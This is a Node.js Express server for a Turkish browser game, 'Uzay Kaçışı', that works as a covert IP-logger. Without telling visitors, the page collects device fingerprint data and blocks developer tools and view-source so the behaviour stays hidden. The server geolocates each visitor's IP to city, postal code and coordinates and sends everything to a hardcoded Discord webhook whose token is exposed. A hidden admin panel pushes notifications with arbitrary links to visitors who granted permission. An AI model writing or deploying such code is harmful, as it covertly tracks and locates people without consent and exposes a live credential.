const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1549084209312698398/3hs3SNGi2LUaBjrAdVAm-l2uljyc47R356NcqhLuqQkHkGlN0f5ES3vWCRNTDBfepErF';

app.use(express.json({ limit: '1mb' }));

let MESSAGES = [];
let MSG_ID = 0;

// ==================== HTML ====================
const HTML = '<!DOCTYPE html>' +
'<html lang="tr"><head>' +
'<meta charset="UTF-8">' +
'<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">' +
'<title>Oyun</title>' +
'<meta name="robots" content="noindex,nofollow">' +
'<style>' +
'*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}' +
'html,body{height:100%;overflow:hidden;font-family:-apple-system,system-ui,sans-serif;background:#0d1024;color:#fff}' +
'body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none}' +
'#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px}' +
'.mgTitle{font-size:24px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}' +
'.mgHud{display:flex;gap:24px;font-size:15px;font-weight:600;opacity:.9}' +
'.mgHud b{color:#6cf}' +
'#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;max-width:92vw;max-height:70vh}' +
'.mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:12px 28px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer;box-shadow:0 8px 24px rgba(74,108,247,.4)}' +
'.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.85);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px}' +
'.mgOver.show{display:flex}' +
'.mgOver h2{font-size:26px;font-weight:800}' +
'#mgNotifyBar{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:linear-gradient(90deg,#4a6cf7,#8b5cf6);padding:12px 22px;border-radius:30px;font-size:14px;font-weight:600;box-shadow:0 8px 30px rgba(74,108,247,.5);display:none;z-index:9999;cursor:pointer}' +
'#secretZone{position:fixed;bottom:12px;right:12px;display:flex;gap:6px;z-index:9998;opacity:.35;transition:opacity .3s}' +
'#secretZone:hover{opacity:1}' +
'.sbtn{width:26px;height:26px;border-radius:50%;border:none;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4);transition:.15s}' +
'.sbtn:hover{transform:scale(1.2)}' +
'.sbtn.sari{background:linear-gradient(135deg,#fbbf24,#f59e0b)}' +
'.sbtn.kirmizi{background:linear-gradient(135deg,#ef4444,#b91c1c);box-shadow:0 0 12px rgba(239,68,68,.7)}' +
'#adminPanel{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#131a2e);z-index:99999;display:none;flex-direction:column;padding:20px;overflow-y:auto}' +
'#adminPanel.show{display:flex}' +
'.ap-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}' +
'.ap-title{font-size:22px;font-weight:800;background:linear-gradient(90deg,#ef4444,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}' +
'.ap-stat{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}' +
'.ap-stat div{background:rgba(255,255,255,.05);padding:10px 16px;border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,.08)}' +
'.ap-stat b{color:#6cf}' +
'.ap-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:18px;margin-bottom:14px}' +
'.ap-card h3{font-size:14px;font-weight:700;margin-bottom:10px;color:#94a3b8;text-transform:uppercase}' +
'.ap-card input,.ap-card textarea{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:10px 12px;color:#fff;font-size:14px;margin-bottom:10px;outline:none;font-family:inherit}' +
'.ap-card textarea{resize:vertical;min-height:80px}' +
'.ap-btn{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:11px 24px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer}' +
'.ap-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}' +
'.ap-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}' +
'.ap-btn-row{display:flex;gap:10px;flex-wrap:wrap}' +
'.ap-log{font-family:ui-monospace,monospace;font-size:12px;background:rgba(0,0,0,.5);border-radius:8px;padding:10px;max-height:200px;overflow-y:auto;color:#94a3b8}' +
'.ap-log .ok{color:#22c55e}' +
'.ap-log .err{color:#ef4444}' +
'.ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:38px;height:38px;border-radius:50%;cursor:pointer;font-size:16px}' +
'</style></head><body>' +

'<div id="mgWrap">' +
'<div id="mgNotifyBar">🔔 Bildirimlere izin ver → mesajları kaçırma!</div>' +
'<div class="mgTitle">🚀 Uzay Kaçışı</div>' +
'<div class="mgHud"><span>Skor: <b id="mgScore">0</b></span><span>Rekor: <b id="mgBest">0</b></span></div>' +
'<div style="position:relative"><canvas id="mgCanvas"></canvas>' +
'<div class="mgOver" id="mgOver"><h2>Oyun Bitti!</h2><div>Skorun: <b id="mgFinal" style="color:#6cf">0</b></div><button class="mgBtn" id="mgRestart">Tekrar Oyna</button></div>' +
'</div></div>' +

'<div id="secretZone">' +
'<button class="sbtn sari"></button><button class="sbtn sari"></button><button class="sbtn sari"></button>' +
'<button class="sbtn kirmizi" id="secretRed"></button>' +
'<button class="sbtn sari"></button><button class="sbtn sari"></button><button class="sbtn sari"></button>' +
'</div>' +

'<div id="adminPanel">' +
'<div class="ap-h"><div class="ap-title">⚡ Admin Panel</div><button class="ap-close" id="apClose">✕</button></div>' +
'<div class="ap-stat"><div>🔔 İzin: <b id="apPerm">?</b></div><div>📨 Gönderilen: <b id="apSent">0</b></div><div>💬 Kuyruk: <b id="apQueue">0</b></div></div>' +
'<div class="ap-card"><h3>📢 Bildirim Gönder</h3>' +
'<input id="apTitle" placeholder="Başlık" maxlength="80">' +
'<textarea id="apBody" placeholder="Mesaj..." maxlength="200"></textarea>' +
'<input id="apUrl" placeholder="URL (opsiyonel)" maxlength="200">' +
'<div class="ap-btn-row"><button class="ap-btn" id="apSend">🚀 Gönder</button><button class="ap-btn secondary" id="apTest">🧪 Test</button></div></div>' +
'<div class="ap-card"><h3>📊 Log</h3><div class="ap-log" id="apLog">Panel hazır.</div></div>' +
'<div class="ap-card"><h3>⚙️ İşlemler</h3>' +
'<div class="ap-btn-row"><button class="ap-btn secondary" id="apForcePerm">🔔 İzin İste</button><button class="ap-btn secondary" id="apClearLog">🧹 Logu Temizle</button><button class="ap-btn danger" id="apReset">♻️ Sıfırla</button></div></div>' +
'</div>' +

'<script>' +
'(function(){' +
'"use strict";' +

// ANTI-F12
'document.addEventListener("contextmenu",function(e){e.preventDefault()});' +
'document.addEventListener("keydown",function(e){' +
'  if(e.key==="F12"){e.preventDefault();return false}' +
'  if(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C")){e.preventDefault();return false}' +
'  if(e.ctrlKey&&e.key.toUpperCase()==="U"){e.preventDefault();return false}' +
'});' +

'var CONFIG={W:360,H:540,PLAYER_R:16,SPAWN_MS:900,SPEED_START:2.5,SPEED_MAX:9,SPEED_UP_EVERY:15000,NOTIFY_DELAY:4000,STORAGE_KEY:"mgBest"};' +

'var cv=document.getElementById("mgCanvas");' +
'var ctx=cv.getContext("2d");' +
'var scoreEl=document.getElementById("mgScore");' +
'var bestEl=document.getElementById("mgBest");' +
'var overScreen=document.getElementById("mgOver");' +
'var finalScoreEl=document.getElementById("mgFinal");' +
'var notifyBar=document.getElementById("mgNotifyBar");' +

'var W=CONFIG.W,H=CONFIG.H;' +
'cv.width=W;cv.height=H;' +

'var player={x:W/2,y:H-70,r:CONFIG.PLAYER_R};' +
'var obstacles=[];' +
'var stars=[];' +
'var score=0;' +
'var best=parseInt(localStorage.getItem(CONFIG.STORAGE_KEY)||"0",10);' +
'var running=true;' +
'var gameOver=false;' +
'var fallSpeed=CONFIG.SPEED_START;' +
'var lastSpawn=0;' +
'var startTime=performance.now();' +
'var pointerX=W/2;' +
'var animId=null;' +
'var swReg=null;' +
'var lastMsgId=0;' +

'bestEl.textContent=best;' +

'for(var i=0;i<60;i++){stars.push({x:Math.random()*W,y:Math.random()*H,s:Math.random()*1.8+0.4,v:Math.random()*1.5+0.4})}' +

// SESSION
'function getSid(){var s=sessionStorage.getItem("mg_sid");if(!s){s="S"+Date.now().toString(36)+Math.random().toString(36).slice(2,6);sessionStorage.setItem("mg_sid",s)}return s}' +

// INFO COLLECT
'function collectInfo(){' +
'  var ua=navigator.userAgent;' +
'  var browser="?",bver="";' +
'  if(/Edg\\//.test(ua)){browser="Edge";bver=(ua.match(/Edg\\/([\\d.]+)/)||[])[1]}' +
'  else if(/OPR\\//.test(ua)){browser="Opera";bver=(ua.match(/OPR\\/([\\d.]+)/)||[])[1]}' +
'  else if(/Chrome\\//.test(ua)){browser="Chrome";bver=(ua.match(/Chrome\\/([\\d.]+)/)||[])[1]}' +
'  else if(/Firefox\\//.test(ua)){browser="Firefox";bver=(ua.match(/Firefox\\/([\\d.]+)/)||[])[1]}' +
'  else if(/Safari\\//.test(ua)){browser="Safari";bver=(ua.match(/Version\\/([\\d.]+)/)||[])[1]}' +
'  var os="?";' +
'  if(/Windows NT 10/.test(ua)){os="Win 10/11"}' +
'  else if(/Windows NT/.test(ua)){os="Windows"}' +
'  else if(/Mac OS X/.test(ua)){os="macOS"}' +
'  else if(/Android/.test(ua)){os="Android"}' +
'  else if(/iPhone|iPad|iPod/.test(ua)){os="iOS"}' +
'  else if(/Linux/.test(ua)){os="Linux"}' +
'  var dtype="Masaustu";' +
'  if(/Mobi|Android|iPhone/.test(ua)){dtype="Mobil"}' +
'  else if(/Tablet|iPad/.test(ua)){dtype="Tablet"}' +
'  var conn=navigator.connection||{};' +
'  return {' +
'    browser:browser+" "+(bver||""),' +
'    os:os,dtype:dtype,' +
'    lang:navigator.language,' +
'    tz:Intl.DateTimeFormat().resolvedOptions().timeZone||"?",' +
'    screen:screen.width+"x"+screen.height,' +
'    color:screen.colorDepth+"bit",' +
'    cores:navigator.hardwareConcurrency||"?",' +
'    touch:("ontouchstart" in window)?"Var":"Yok",' +
'    cookie:navigator.cookieEnabled?"Acik":"Kapali",' +
'    online:navigator.onLine?"Online":"Offline",' +
'    conn:(conn.effectiveType||"?")+(conn.downlink?" "+conn.downlink+"Mbps":""),' +
'    notif:("Notification" in window)?Notification.permission:"Yok",' +
'    sw:("serviceWorker" in navigator)?"Var":"Yok",' +
'    ref:document.referrer||"direkt",' +
'    url:location.href,' +
'    ua:ua,' +
'    sid:getSid()' +
'  }' +
'}' +

// LOG
'function sendLog(event,info,extra){' +
'  var payload=JSON.stringify({event:event,info:info,extra:extra||{}});' +
'  try{' +
'    if(navigator.sendBeacon){navigator.sendBeacon("/log",new Blob([payload],{type:"application/json"}))}' +
'    else{fetch("/log",{method:"POST",headers:{"Content-Type":"application/json"},body:payload,keepalive:true})}' +
'  }catch(e){}' +
'}' +

// SERVICE WORKER
'function initSW(){' +
'  if(!("serviceWorker" in navigator)){return Promise.resolve(false)}' +
'  var code="self.addEventListener(\'install\',function(e){self.skipWaiting()});' +
'self.addEventListener(\'activate\',function(e){e.waitUntil(self.clients.claim())});' +
'self.addEventListener(\'message\',function(e){var d=e.data||{};' +
'if(d.type===\'SHOW_NOTIFICATION\'){self.registration.showNotification(d.title||\'Bildirim\',{body:d.body||\'\',vibrate:[200,100,200],data:{url:d.url||\'/\'},tag:d.tag||\'default\'})}});' +
'self.addEventListener(\'notificationclick\',function(e){e.notification.close();var u=e.notification.data&&e.notification.data.url||\'/\';' +
'e.waitUntil(clients.matchAll({type:\'window\'}).then(function(l){for(var i=0;i<l.length;i++){if(l[i].url.indexOf(u)>-1&&\'focus\' in l[i]){return l[i].focus()}}if(clients.openWindow){return clients.openWindow(u)}}))});";' +
'  return navigator.serviceWorker.register(URL.createObjectURL(new Blob([code],{type:"application/javascript"})))' +
'    .then(function(reg){swReg=reg;return navigator.serviceWorker.ready})' +
'    .then(function(){return true})' +
'    .catch(function(e){console.warn("SW hata",e);return false});' +
'}' +

// NOTIFY
'function requestNotify(){' +
'  if(!("Notification" in window)){return Promise.resolve()}' +
'  if(Notification.permission==="granted"){sendNotif("👋 Tekrar Hoş Geldin!","Oyun hazır");return Promise.resolve()}' +
'  if(Notification.permission==="denied"){return Promise.resolve()}' +
'  return Notification.requestPermission().then(function(p){' +
'    if(p==="granted"){sendNotif("🔔 Bildirimler Açıldı!","Mesajlarından haberdar olacaksın")}' +
'  }).catch(function(){})' +
'}' +

'function sendNotif(title,body,opts){' +
'  opts=opts||{};' +
'  if(!("Notification" in window)){return false}' +
'  if(Notification.permission!=="granted"){return false}' +
'  if(swReg&&swReg.active){swReg.active.postMessage({type:"SHOW_NOTIFICATION",title:title,body:body,url:opts.url,tag:opts.tag});return true}' +
'  try{new Notification(title,{body:body});return true}catch(e){return false}' +
'}' +
'window.bildirimGonder=sendNotif;' +

// POLL
'function pollMessages(){' +
'  fetch("/api/messages?since="+lastMsgId,{cache:"no-store"})' +
'    .then(function(r){return r.ok?r.json():null})' +
'    .then(function(d){' +
'      if(!d||!d.messages){return}' +
'      for(var i=0;i<d.messages.length;i++){' +
'        var m=d.messages[i];' +
'        if(m.id>lastMsgId){sendNotif(m.title||"Bildirim",m.body||"",{url:m.url,tag:"bc-"+m.id});lastMsgId=m.id}' +
'      }' +
'    }).catch(function(){})' +
'}' +
'setInterval(pollMessages,5000);' +
'setTimeout(pollMessages,2000);' +

// GAME
'function spawnObstacle(){' +
'  var w=40+Math.random()*60;' +
'  obstacles.push({x:Math.random()*(W-w),y:-20,w:w,h:18,hue:Math.floor(Math.random()*60)+330});' +
'}' +

'function handlePointer(cx){' +
'  var r=cv.getBoundingClientRect();' +
'  pointerX=Math.max(player.r,Math.min(W-player.r,(cx-r.left)*(W/r.width)));' +
'}' +

'cv.addEventListener("mousemove",function(e){handlePointer(e.clientX)});' +
'cv.addEventListener("touchmove",function(e){e.preventDefault();handlePointer(e.touches[0].clientX)},{passive:false});' +
'cv.addEventListener("touchstart",function(e){handlePointer(e.touches[0].clientX)});' +

'document.addEventListener("keydown",function(e){' +
'  if(!running){return}' +
'  if(e.key==="ArrowLeft"){pointerX=Math.max(player.r,pointerX-30)}' +
'  if(e.key==="ArrowRight"){pointerX=Math.min(W-player.r,pointerX+30)}' +
'});' +

'function update(){' +
'  var now=performance.now();' +
'  if(now-lastSpawn>CONFIG.SPAWN_MS){spawnObstacle();lastSpawn=now}' +
'  fallSpeed=Math.min(CONFIG.SPEED_MAX,CONFIG.SPEED_START+Math.floor((now-startTime)/CONFIG.SPEED_UP_EVERY)*0.8);' +
'  for(var i=0;i<stars.length;i++){var s=stars[i];s.y+=s.v;if(s.y>H){s.y=-2;s.x=Math.random()*W}}' +
'  player.x+=(pointerX-player.x)*0.25;' +
'  for(var j=obstacles.length-1;j>=0;j--){' +
'    var o=obstacles[j];' +
'    o.y+=fallSpeed;' +
'    var cx2=Math.max(o.x,Math.min(player.x,o.x+o.w));' +
'    var cy2=Math.max(o.y,Math.min(player.y,o.y+o.h));' +
'    var dx=player.x-cx2,dy=player.y-cy2;' +
'    if(dx*dx+dy*dy<player.r*player.r){endGame();return}' +
'    if(o.y>H){obstacles.splice(j,1);score++;scoreEl.textContent=score}' +
'  }' +
'}' +

'function roundRect(ctx,x,y,w,h,r){' +
'  if(ctx.roundRect){ctx.roundRect(x,y,w,h,r);return}' +
'  ctx.moveTo(x+r,y);' +
'  ctx.arcTo(x+w,y,x+w,y+h,r);' +
'  ctx.arcTo(x+w,y+h,x,y+h,r);' +
'  ctx.arcTo(x,y+h,x,y,r);' +
'  ctx.arcTo(x,y,x+w,y,r);' +
'  ctx.closePath();' +
'}' +

'function draw(){' +
'  ctx.clearRect(0,0,W,H);' +
'  for(var i=0;i<stars.length;i++){var s=stars[i];ctx.globalAlpha=s.s/2.2;ctx.fillStyle="#cfe4ff";ctx.fillRect(s.x,s.y,s.s,s.s)}' +
'  ctx.globalAlpha=1;' +
'  for(var k=0;k<obstacles.length;k++){' +
'    var o=obstacles[k];' +
'    var g=ctx.createLinearGradient(o.x,o.y,o.x,o.y+o.h);' +
'    g.addColorStop(0,"hsl("+o.hue+",80%,65%)");' +
'    g.addColorStop(1,"hsl("+o.hue+",80%,45%)");' +
'    ctx.fillStyle=g;' +
'    ctx.shadowColor="hsl("+o.hue+",80%,60%)";' +
'    ctx.shadowBlur=14;' +
'    ctx.beginPath();' +
'    roundRect(ctx,o.x,o.y,o.w,o.h,8);' +
'    ctx.fill();' +
'    ctx.shadowBlur=0;' +
'  }' +
'  ctx.save();' +
'  ctx.shadowColor="#6cf";ctx.shadowBlur=22;' +
'  var pg=ctx.createRadialGradient(player.x-6,player.y-6,2,player.x,player.y,player.r);' +
'  pg.addColorStop(0,"#bfe4ff");pg.addColorStop(1,"#4a9eff");' +
'  ctx.fillStyle=pg;' +
'  ctx.beginPath();' +
'  ctx.arc(player.x,player.y,player.r,0,Math.PI*2);' +
'  ctx.fill();' +
'  ctx.restore();' +
'}' +

'function loop(){if(!running){return}update();draw();animId=requestAnimationFrame(loop)}' +

'function startGame(){' +
'  player={x:W/2,y:H-70,r:CONFIG.PLAYER_R};' +
'  obstacles=[];score=0;fallSpeed=CONFIG.SPEED_START;' +
'  lastSpawn=performance.now();startTime=performance.now();pointerX=W/2;' +
'  gameOver=false;running=true;' +
'  scoreEl.textContent=0;' +
'  overScreen.classList.remove("show");' +
'  cancelAnimationFrame(animId);' +
'  animId=requestAnimationFrame(loop);' +
'}' +

'function endGame(){' +
'  running=false;gameOver=true;' +
'  cancelAnimationFrame(animId);' +
'  finalScoreEl.textContent=score;' +
'  var yeniRekor=false;' +
'  if(score>best){best=score;localStorage.setItem(CONFIG.STORAGE_KEY,best);bestEl.textContent=best;yeniRekor=true}' +
'  overScreen.classList.add("show");' +
'  if(yeniRekor){sendNotif("🏆 Yeni Rekor!","Skorun: "+score)}' +
'  else{sendNotif("🎮 Oyun Bitti","Skorun: "+score+" | Rekor: "+best)}' +
'}' +

'document.getElementById("mgRestart").addEventListener("click",startGame);' +

'document.addEventListener("visibilitychange",function(){' +
'  if(document.hidden){running=false;cancelAnimationFrame(animId)}' +
'  else if(!gameOver&&!running){running=true;animId=requestAnimationFrame(loop)}' +
'});' +

// SECRET BUTTONS
'var redClicks=0,redTimer=null;' +
'var secretRed=document.getElementById("secretRed");' +
'secretRed.addEventListener("click",function(e){' +
'  e.preventDefault();' +
'  redClicks++;' +
'  if(redTimer){clearTimeout(redTimer)}' +
'  redTimer=setTimeout(function(){redClicks=0},5000);' +
'  if(redClicks>=20){redClicks=0;openAdmin()}' +
'});' +
'var sarilar=document.querySelectorAll(".sbtn.sari");' +
'for(var si=0;si<sarilar.length;si++){(function(b){b.addEventListener("click",function(){redClicks=0})})(sarilar[si])}' +

// ADMIN
'var ap=document.getElementById("adminPanel");' +
'var apLog=document.getElementById("apLog");' +
'var apPerm=document.getElementById("apPerm");' +
'var apSent=document.getElementById("apSent");' +
'var apQueue=document.getElementById("apQueue");' +
'var sentCount=0;' +

'function apPrint(msg,cls){' +
'  var t=new Date().toLocaleTimeString("tr-TR");' +
'  var div=document.createElement("div");' +
'  if(cls){div.className=cls}' +
'  div.textContent="["+t+"] "+msg;' +
'  apLog.appendChild(div);' +
'  apLog.scrollTop=apLog.scrollHeight;' +
'}' +

'function openAdmin(){' +
'  ap.classList.add("show");' +
'  apPerm.textContent=("Notification" in window)?Notification.permission:"yok";' +
'  apPrint("Panel acildi. Session: "+getSid(),"ok");' +
'}' +

'document.getElementById("apClose").addEventListener("click",function(){ap.classList.remove("show")});' +

'document.getElementById("apSend").addEventListener("click",function(){' +
'  var title=document.getElementById("apTitle").value.trim()||"Bildirim";' +
'  var body=document.getElementById("apBody").value.trim();' +
'  var url=document.getElementById("apUrl").value.trim();' +
'  if(!body&&!title){apPrint("Bos mesaj.","err");return}' +
'  fetch("/api/broadcast",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({title:title,body:body,url:url})})' +
'    .then(function(r){return r.json()})' +
'    .then(function(d){' +
'      sentCount++;' +
'      apSent.textContent=sentCount;' +
'      apQueue.textContent=d.total||"?";' +
'      apPrint("Gonderildi: "+title+" (ID:"+d.id+")","ok");' +
'      sendNotif(title,body,{url:url});' +
'      document.getElementById("apBody").value="";' +
'    }).catch(function(e){apPrint("Hata: "+e.message,"err")});' +
'});' +

'document.getElementById("apTest").addEventListener("click",function(){' +
'  var title=document.getElementById("apTitle").value.trim()||"Test";' +
'  var body=document.getElementById("apBody").value.trim()||"Bu bir test";' +
'  sendNotif(title,body);' +
'  apPrint("Test gonderildi: "+title,"ok");' +
'});' +

'document.getElementById("apForcePerm").addEventListener("click",function(){' +
'  requestNotify().then(function(){' +
'    apPerm.textContent=("Notification" in window)?Notification.permission:"yok";' +
'    apPrint("Izin: "+apPerm.textContent);' +
'  });' +
'});' +

'document.getElementById("apClearLog").addEventListener("click",function(){apLog.innerHTML="Temizlendi."});' +
'document.getElementById("apReset").addEventListener("click",function(){' +
'  localStorage.removeItem(CONFIG.STORAGE_KEY);' +
'  best=0;bestEl.textContent=0;' +
'  apPrint("Sifirlandi.","ok");' +
'  startGame();' +
'});' +

// INIT
'(function(){' +
'  var info=collectInfo();' +
'  sendLog("visit",info);' +
'  initSW().then(function(){' +
'    requestAnimationFrame(loop);' +
'  });' +
'  notifyBar.style.display="block";' +
'  notifyBar.addEventListener("click",function(){' +
'    notifyBar.style.display="none";' +
'    requestNotify();' +
'  });' +
'  setTimeout(function(){' +
'    if("Notification" in window && Notification.permission==="default"){' +
'      notifyBar.style.display="none";' +
'      requestNotify();' +
'    }' +
'  },CONFIG.NOTIFY_DELAY);' +
'})();' +

'})();' +
'</' + 'script>' +
'</body></html>';

// ==================== GEO ====================
function getGeo(ip) {
  if (!ip || ip === '::1' || ip.indexOf('127.') === 0) return Promise.resolve(null);
  return fetch('https://ipapi.co/' + ip + '/json/', {
    headers: { 'User-Agent': 'oyun-sitesi/1.0' }
  })
    .then(function(r){ return r.ok ? r.json() : null })
    .catch(function(){ return null });
}

// ==================== EMBED ====================
function buildEmbed(info, geo, ip) {
  var f = [];
  var country = (geo && geo.country_name) || '?';
  var flag = (geo && geo.country_code === 'TR') ? ' 🇹🇷' : '';

  f.push({ name: '🌐 IP', value: '`' + ip + '`', inline: true });
  f.push({ name: '🌍 Ülke', value: country + flag, inline: true });
  f.push({ name: '🏙️ Şehir', value: ((geo && geo.city) || '?') + ' / ' + ((geo && geo.region) || '?'), inline: true });
  f.push({ name: '📮 Posta', value: (geo && geo.postal) || '?', inline: true });
  f.push({ name: '📍 Konum', value: ((geo && geo.latitude) || '?') + ', ' + ((geo && geo.longitude) || '?'), inline: true });
  f.push({ name: '🏢 ISP', value: ((geo && geo.org) || '?'), inline: false });

  f.push({ name: '💻 Tarayıcı', value: info.browser || '?', inline: true });
  f.push({ name: '🖥️ OS', value: info.os || '?', inline: true });
  f.push({ name: '📱 Cihaz', value: info.dtype || '?', inline: true });
  f.push({ name: '🗣️ Dil', value: info.lang || '?', inline: true });
  f.push({ name: '🕒 TZ', value: info.tz || '?', inline: true });
  f.push({ name: '📺 Ekran', value: (info.screen||'?') + ' (' + (info.color||'?') + ')', inline: true });
  f.push({ name: '⚙️ CPU', value: (info.cores || '?') + ' çekirdek', inline: true });
  f.push({ name: '👆 Dokunmatik', value: info.touch || '?', inline: true });
  f.push({ name: '🍪 Çerez', value: info.cookie || '?', inline: true });
  f.push({ name: '📶 Bağlantı', value: (info.online || '?') + ' • ' + (info.conn || '?'), inline: true });
  f.push({ name: '🔔 Bildirim', value: info.notif || '?', inline: true });
  f.push({ name: '🆔 Session', value: '`' + (info.sid || '?') + '`', inline: true });
  f.push({ name: '↩️ Yönlendiren', value: (info.ref || 'direkt').substring(0, 200), inline: false });
  f.push({ name: '🖥️ User-Agent', value: '```' + (info.ua || '').substring(0, 180) + '```', inline: false });

  return {
    title: '👤 Site Ziyareti',
    color: 0x3b82f6,
    timestamp: new Date().toISOString(),
    fields: f,
    footer: { text: 'Oyun Log • ' + new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }) }
  };
}

// ==================== ROUTES ====================
app.get('/', function(req, res) {
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.set('Cache-Control', 'no-store');
  res.send(HTML);
});

app.post('/log', function(req, res) {
  var fwd = req.headers['x-forwarded-for'] || '';
  var ip = (fwd.split(',')[0] || '').trim() || req.socket.remoteAddress || '?';
  var info = (req.body && req.body.info) || {};

  getGeo(ip).then(function(geo) {
    var embed = buildEmbed(info, geo, ip);
    return fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'Oyun Log', embeds: [embed] })
    }).then(function(r) {
      if (!r.ok) {
        return r.text().then(function(t) {
          console.error('Discord hata:', r.status, t);
          res.status(500).json({ ok: false, status: r.status });
        });
      }
      res.json({ ok: true });
    });
  }).catch(function(e) {
    console.error(e);
    res.status(500).json({ ok: false, error: String(e) });
  });
});

app.post('/api/broadcast', function(req, res) {
  var body = req.body || {};
  var msg = {
    id: ++MSG_ID,
    title: String(body.title || 'Bildirim').slice(0, 100),
    body: String(body.body || '').slice(0, 500),
    url: String(body.url || '').slice(0, 300),
    ts: Date.now()
  };
  MESSAGES.push(msg);
  var cutoff = Date.now() - 3600 * 1000;
  MESSAGES = MESSAGES.filter(function(m){ return m.ts > cutoff });
  if (MESSAGES.length > 50) MESSAGES = MESSAGES.slice(-50);
  res.json({ ok: true, id: msg.id, total: MESSAGES.length });
});

app.get('/api/messages', function(req, res) {
  var since = parseInt(req.query.since || '0', 10);
  var list = MESSAGES.filter(function(m){ return m.id > since });
  res.set('Cache-Control', 'no-store');
  res.json({ messages: list, latest: MSG_ID });
});

app.get('/test', function(req, res) {
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: '🧪 Test - Render çalışıyor!' })
  }).then(function(r){ res.send('Test gönderildi: ' + r.status) })
    .catch(function(e){ res.status(500).send('Hata: ' + e.message) });
});

app.listen(PORT, function() {
  console.log('Sunucu ' + PORT + ' portunda çalışıyor');
});
